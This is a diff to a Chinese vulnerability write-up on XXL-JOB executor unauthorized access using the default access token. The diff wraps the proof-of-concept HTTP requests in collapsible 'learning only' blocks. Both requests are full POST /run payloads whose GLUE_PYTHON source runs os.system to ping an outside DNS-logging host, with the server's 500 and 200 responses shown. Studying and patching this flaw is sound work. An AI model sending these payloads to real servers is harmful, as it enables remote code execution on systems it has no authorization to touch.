@@ -63,8 +63,10 @@ xxl.job.accessToken=default_token
 
 首先，我们不带 `XXL-JOB-ACCESS-TOKEN`，对 executor 未授权访问漏洞进行利用，探测目标是否出网。此处运行模式为 GLUE 模式 (Python)，其他方式均可，主要取决于目标环境。
 
-```
-POST /run HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /run HTTP/1.1
 Host: your-ip:9999
 Accept-Encoding: gzip, deflate
 Accept: */*
@@ -83,12 +85,13 @@ Content-Length: 407
   "logId": 1,
   "logDateTime": 1586629003729,
   "glueType": "GLUE_PYTHON",
-  "glueSource": "import os\nos.system('ping 0e6ee0e0f3.ipv6.1433.eu.org.')",
+  "glueSource": "import os\nos.&#115;ystem('ping 0e6ee0e0f3.ipv6.1433.eu.org.')",
   "glueUpdatetime": 1586699003758,
   "broadcastIndex": 0,
   "broadcastTotal": 0
-}
-```
+}</code></pre>
+
+</details>
 
 HTTP Status Code 500，报错：
 
@@ -100,8 +103,10 @@ HTTP Status Code 500，报错：
 
 然后，我们带上 `XXL-JOB-ACCESS-TOKEN`，再次发送数据包：
 
-```
-POST /run HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /run HTTP/1.1
 Host: your-ip:9999
 Accept-Encoding: gzip, deflate
 Accept: */*
@@ -121,12 +126,13 @@ Content-Length: 407
   "logId": 1,
   "logDateTime": 1586629003729,
   "glueType": "GLUE_PYTHON",
-  "glueSource": "import os\nos.system('ping d02caeb35f.ipv6.1433.eu.org.')",
+  "glueSource": "import os\nos.&#115;ystem('ping d02caeb35f.ipv6.1433.eu.org.')",
   "glueUpdatetime": 1586699003758,
   "broadcastIndex": 0,
   "broadcastTotal": 0
-}
-```
+}</code></pre>
+
+</details>
 
 HTTP Status Code 200，成功：
 
